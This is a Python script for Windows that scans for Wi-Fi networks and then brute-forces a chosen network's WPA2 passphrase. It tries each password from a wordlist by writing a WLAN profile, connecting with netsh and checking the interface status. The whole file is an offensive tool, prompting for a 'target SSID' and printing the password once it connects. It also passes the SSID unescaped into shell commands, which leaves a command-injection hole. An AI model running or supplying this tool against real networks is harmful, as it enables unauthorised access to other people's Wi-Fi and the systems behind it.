import subprocess
import time

def scan_networks():
    print("[*] Scanning for Wi-Fi networks...")
    result = subprocess.check_output("netsh wlan show networks", shell=True, encoding='utf-8')
    print(result)

def try_connect(ssid, password):
    profile = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>auto</connectionMode>   
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPA2PSK</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>
    """
    with open(f"{ssid}.xml", "w") as file:
        file.write(profile)

    subprocess.call(f'netsh wlan add profile filename="{ssid}.xml"', shell=True)
    subprocess.call(f'netsh wlan connect name="{ssid}" ssid="{ssid}"', shell=True)
    time.sleep(5)
    status = subprocess.check_output("netsh wlan show interfaces", shell=True, encoding='utf-8')
    if ssid in status:
        print(f"[+] Connected to {ssid} with password: {password}")
        return True
    else:
        print(f"[-] Failed with password: {password}")
        return False

def brute_force(ssid, wordlist_path):
    with open(wordlist_path, "r") as file:
        for line in file:
            password = line.strip()
            if try_connect(ssid, password):
                break

# Example usage
scan_networks()
target_ssid = input("Enter target SSID: ")
wordlist_file = input("Enter path to password wordlist: ")
brute_force(target_ssid, wordlist_file)